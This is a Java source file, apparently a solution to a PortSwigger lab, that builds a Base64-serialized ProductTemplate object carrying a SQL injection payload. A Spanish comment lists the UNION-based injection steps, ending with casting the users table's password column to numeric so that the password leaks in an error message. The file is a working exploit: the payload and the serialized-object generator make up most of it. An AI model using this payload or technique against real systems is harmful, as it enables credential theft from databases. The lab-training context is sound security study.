import data.productcatalog.ProductTemplate;
//import data.productcatalog.Product;
//import data.ProductTemplate;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.util.Base64;

//Probando con repo de portswigger: 
/*
1. Compruebo la comilla simple, apostrofe `'`     
2. `1' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--` Con null’s hasta comprobar cual no me retorna errores, en este caso 8 null’s pero junto con UNION efectivamente, el 1 es para crear una tabla de consulta.     
3. `' UNION SELECT NULL, NULL, NULL, password, NULL, NULL, NULL, NULL FROM users--` Verificar que se puede seleccionar la columna password de la tabla users e insertarla en el resultado de la consulta original, y en la posición correcta, ya que el orden de las columnas es muy importante.
4. `' UNION SELECT NULL, NULL, NULL, CAST(password AS VARCHAR), NULL, NULL, NULL, NULL FROM users--` Intentar convertir la columna password a VARCHAR, que suele ser el tipo de dato correcto, pero es posible que no nos deje pasar alguna validación de tipo de datos por como se muestra por pantalla.
5. `' UNION SELECT NULL, NULL, NULL, CAST(password AS numeric), NULL, NULL, NULL, NULL FROM users—` → displays the password in the error message.
*/
class Main {
    public static void main(String[] args) throws Exception {
        //AccessTokenUser originalObject = new AccessTokenUser("Test", "Test");
        ProductTemplate productTemplate = new ProductTemplate("' UNION SELECT NULL, NULL, NULL, CAST(password AS numeric), NULL, NULL, NULL, NULL FROM users--"); //Payload inyección SQL

        String serializedObject = serialize(productTemplate);

        System.out.println("Serialized object: " + serializedObject);

        ProductTemplate deserializedObject = deserialize(serializedObject);

        System.out.println("Deserialized Object: " + deserializedObject.getId());
    }

    private static String serialize(Serializable obj) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream(512);
        try (ObjectOutputStream out = new ObjectOutputStream(baos)) {
            out.writeObject(obj);
        }
        return Base64.getEncoder().encodeToString(baos.toByteArray());
    }

    private static <T> T deserialize(String base64SerializedObj) throws Exception {
        try (ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(base64SerializedObj)))) {
            @SuppressWarnings("unchecked")
            T obj = (T) in.readObject();
            return obj;
        }
    }
}